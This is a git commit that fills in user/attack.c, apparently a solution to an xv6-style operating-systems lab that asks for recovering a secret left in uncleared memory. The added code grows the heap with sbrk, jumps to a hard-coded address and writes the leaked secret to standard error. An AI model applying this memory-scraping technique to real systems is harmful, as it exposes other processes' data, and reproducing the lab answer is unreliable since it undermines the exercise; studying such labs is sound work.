8c6651467411525971712629648f09f9342084cd
wanower <suguguan@qq.com>
2025-06-15 18:01:21 +0800

    Implement the attack

--- user/attack.c
+++ user/attack.c
@@ -8,6 +8,13 @@ main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
-
+  char *secret = sbrk(PGSIZE*32);
+  for (char *p = secret + 32; p < secret + PGSIZE*32; p++) {
+    if (p == (char *)(0x14020)) {
+      printf("Found secret: %s\n", p);
+      write(2, p, 8);
+      break;
+    }
+  }
   exit(1);
 }
